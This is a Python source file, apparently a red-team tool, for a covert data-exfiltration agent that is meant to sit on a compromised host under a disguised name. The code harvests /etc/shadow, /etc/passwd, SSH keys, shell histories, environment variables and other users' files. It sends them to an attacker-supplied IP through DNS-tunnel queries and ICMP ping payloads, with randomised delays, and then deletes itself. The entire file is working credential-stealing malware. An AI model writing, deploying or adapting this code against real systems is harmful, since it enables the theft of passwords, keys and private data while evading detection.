#!/usr/bin/env python3
"""
Red Team - Exfil Agent (靶機端)
自動蒐集敏感資料，透過 DNS/ICMP 隱蔽通道外傳
Usage: python3 exfil_agent.py <ATTACKER_IP>
Deployed as: /tmp/.cache_update.py
"""

import os
import sys
import subprocess
import base64
import hashlib
import struct
import socket
import glob
import time
import random

if len(sys.argv) < 2:
    print("Usage: python3 exfil_agent.py <ATTACKER_IP>")
    sys.exit(1)

ATTACKER_IP = sys.argv[1]
CHUNK_SIZE = 50
ICMP_CHUNK = 7
DNS_DELAY = (0.1, 0.5)
ICMP_DELAY = (0.2, 0.8)

# ── Channel Detection ─────────────────────────────────────────────────
def detect_channel():
    # Try DNS with dig
    try:
        r = subprocess.run(
            ["dig", f"@{ATTACKER_IP}", "test.x.exfil.local", "+short",
             "+timeout=2", "+tries=1"],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=5
        )
        if r.returncode == 0:
            return "dns"
    except (FileNotFoundError, subprocess.TimeoutExpired):
        pass

    # Try Python DNS socket as fallback
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.settimeout(3)
        query = _build_dns_query("test.x.exfil.local")
        sock.sendto(query, (ATTACKER_IP, 53))
        sock.recv(512)
        sock.close()
        return "dns_py"
    except Exception:
        pass

    # Try ICMP
    try:
        r = subprocess.run(
            ["ping", "-c", "1", "-W", "2", ATTACKER_IP],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=5
        )
        if r.returncode == 0:
            return "icmp"
    except (FileNotFoundError, subprocess.TimeoutExpired):
        pass

    return None

# ── Data Collection ───────────────────────────────────────────────────
def collect_targets():
    targets = []

    # Static file targets
    static_files = [
        "/etc/passwd",
        "/etc/shadow",
        os.path.expanduser("~/.bash_history"),
        os.path.expanduser("~/.bashrc"),
        os.path.expanduser("~/target_app.py"),
        os.path.expanduser("~/trap.log"),
    ]
    # SSH keys
    ssh_dir = os.path.expanduser("~/.ssh")
    if os.path.isdir(ssh_dir):
        for f in os.listdir(ssh_dir):
            static_files.append(os.path.join(ssh_dir, f))

    for path in static_files:
        try:
            with open(path, 'rb') as f:
                data = f.read()
            if data:
                name = os.path.basename(path)
                targets.append((name, data))
        except (PermissionError, FileNotFoundError, IsADirectoryError):
            pass

    # Command outputs
    cmds = {"crontab": "crontab -l", "env": "env"}
    for name, cmd in cmds.items():
        try:
            out = subprocess.check_output(cmd, shell=True, stderr=subprocess.DEVNULL, timeout=5)
            if out:
                targets.append((name, out))
        except Exception:
            pass

    # Scan other users' home dirs
    try:
        with open("/etc/passwd", "r") as f:
            for line in f:
                parts = line.strip().split(":")
                if len(parts) >= 6:
                    home = parts[5]
                    if home.startswith("/home/") and os.path.isdir(home):
                        _scan_home(home, targets)
    except Exception:
        pass

    return targets

def _scan_home(home_dir, targets):
    patterns = [
        os.path.join(home_dir, ".bash_history"),
        os.path.join(home_dir, ".bashrc"),
    ]
    # SSH keys
    ssh_dir = os.path.join(home_dir, ".ssh")
    if os.path.isdir(ssh_dir):
        for f in os.listdir(ssh_dir):
            patterns.append(os.path.join(ssh_dir, f))
    # Python scripts
    for py in glob.glob(os.path.join(home_dir, "*.py")):
        patterns.append(py)

    user = os.path.basename(home_dir)
    for path in patterns:
        try:
            with open(path, 'rb') as f:
                data = f.read()
            if data:
                name = f"{user}_{os.path.basename(path)}"
                targets.append((name, data))
        except (PermissionError, FileNotFoundError, IsADirectoryError):
            pass

# ── DNS Sender ────────────────────────────────────────────────────────
def _build_dns_query(domain):
    txid = os.urandom(2)
    flags = b'\x01\x00'
    counts = struct.pack('>HHHH', 1, 0, 0, 0)
    header = txid + flags + counts
    question = b''
    for label in domain.split('.'):
        question += bytes([len(label)]) + label.encode('ascii')
    question += b'\x00'
    question += struct.pack('>HH', 1, 1)  # Type A, Class IN
    return header + question

def _send_dns(domain, use_dig=True):
    if use_dig:
        subprocess.run(
            ["dig", f"@{ATTACKER_IP}", domain, "+short", "+timeout=1", "+tries=1"],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
        )
    else:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(2)
            sock.sendto(_build_dns_query(domain), (ATTACKER_IP, 53))
            try:
                sock.recv(512)
            except socket.timeout:
                pass
            sock.close()
        except Exception:
            pass

def send_file_dns(filename, data, use_dig=True):
    file_id = hashlib.md5(filename.encode()).hexdigest()[:4]
    b64data = base64.b64encode(data).decode()
    raw_bytes = b64data.encode()

    # Chunk into CHUNK_SIZE pieces
    chunks = []
    for i in range(0, len(raw_bytes), CHUNK_SIZE):
        chunks.append(raw_bytes[i:i + CHUNK_SIZE])
    total = len(chunks)

    # START signal
    fname_b32 = base64.b32encode(filename.encode()).decode().rstrip("=").lower()
    domain = f"start.{fname_b32}.{file_id}.x.exfil.local"
    _send_dns(domain, use_dig)
    time.sleep(random.uniform(*DNS_DELAY))

    # Data chunks
    for seq, chunk in enumerate(chunks):
        chunk_b32 = base64.b32encode(chunk).decode().rstrip("=").lower()
        domain = f"{seq:04d}-{total:04d}.{chunk_b32}.{file_id}.x.exfil.local"
        _send_dns(domain, use_dig)
        time.sleep(random.uniform(*DNS_DELAY))

    # END signal
    checksum = hashlib.md5(raw_bytes).hexdigest()[:8]
    domain = f"end.{checksum}.{file_id}.x.exfil.local"
    _send_dns(domain, use_dig)
    time.sleep(random.uniform(*DNS_DELAY))

    print(f"[+] {filename}: {total} DNS chunks sent")

# ── ICMP Sender ───────────────────────────────────────────────────────
ICMP_MAGIC = b'\xef\xbe'

def _send_icmp(hex_pattern, size=1016):
    subprocess.run(
        ["ping", "-c", "1", "-W", "1", "-s", str(size), "-p", hex_pattern,
         ATTACKER_IP],
        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
    )

def send_file_icmp(filename, data):
    file_id_bytes = hashlib.md5(filename.encode()).digest()[:2]
    file_id = file_id_bytes.hex()
    b64data = base64.b64encode(data).decode()
    raw_bytes = b64data.encode()

    chunks = []
    for i in range(0, len(raw_bytes), ICMP_CHUNK):
        chunks.append(raw_bytes[i:i + ICMP_CHUNK])
    total = len(chunks)

    # START: magic(2) + type=0x01(1) + file_id(2) + filename(11)
    fname_bytes = filename.encode('utf-8')[:11].ljust(11, b'\x00')
    start_payload = ICMP_MAGIC + b'\x01' + file_id_bytes + fname_bytes
    _send_icmp(start_payload.hex())
    time.sleep(random.uniform(*ICMP_DELAY))

    # DATA: magic(2) + type=0x00(1) + file_id(2) + seq(2) + total(2) + data(7)
    for seq, chunk in enumerate(chunks):
        chunk_padded = chunk.ljust(ICMP_CHUNK, b'\x00')
        pkt = (ICMP_MAGIC + b'\x00' + file_id_bytes +
               struct.pack('>HH', seq, total) + chunk_padded)
        _send_icmp(pkt.hex())
        time.sleep(random.uniform(*ICMP_DELAY))

    # END: magic(2) + type=0x02(1) + file_id(2) + checksum(8) + pad(3)
    checksum = hashlib.md5(raw_bytes).hexdigest()[:8].encode()
    end_payload = ICMP_MAGIC + b'\x02' + file_id_bytes + checksum + b'\x00' * 3
    _send_icmp(end_payload.hex())
    time.sleep(random.uniform(*ICMP_DELAY))

    print(f"[+] {filename}: {total} ICMP chunks sent")

# ── Main ──────────────────────────────────────────────────────────────
def main():
    print("[*] Exfil Agent starting...")
    print(f"[*] Attacker IP: {ATTACKER_IP}")

    # Channel detection
    print("[*] Detecting available channels...")
    channel = detect_channel()
    if channel is None:
        print("[X] No channel available, aborting")
        cleanup()
        sys.exit(1)
    print(f"[+] Channel: {channel}")

    # Collect targets
    print("[*] Collecting targets...")
    targets = collect_targets()
    if not targets:
        print("[X] No readable targets found")
        cleanup()
        sys.exit(1)

    for name, data in targets:
        size = len(data)
        unit = "KB" if size >= 1024 else "B"
        val = f"{size / 1024:.1f}" if size >= 1024 else str(size)
        print(f"[+] {name} ({val}{unit})")

    # Exfiltrate
    print(f"\n[*] Exfiltrating {len(targets)} files via {channel}...")
    for name, data in targets:
        if channel == "dns":
            send_file_dns(name, data, use_dig=True)
        elif channel == "dns_py":
            send_file_dns(name, data, use_dig=False)
        elif channel == "icmp":
            send_file_icmp(name, data)

    print(f"\n[*] Done. {len(targets)} files exfiltrated.")
    cleanup()

# ── Stealth: Self-Delete ──────────────────────────────────────────────
def cleanup():
    try:
        os.remove(os.path.abspath(__file__))
        print("[*] Agent self-deleted")
    except Exception:
        pass

if __name__ == "__main__":
    main()
